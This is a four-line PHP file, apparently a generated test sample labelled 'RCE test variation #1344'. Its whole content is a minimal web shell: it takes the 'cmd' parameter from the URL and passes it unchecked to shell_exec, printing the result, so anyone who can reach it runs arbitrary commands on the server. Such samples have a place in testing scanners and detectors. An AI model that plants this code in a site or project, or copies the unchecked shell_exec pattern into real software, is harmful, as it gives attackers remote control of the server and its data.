<?php
// RCE test variation #1344
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>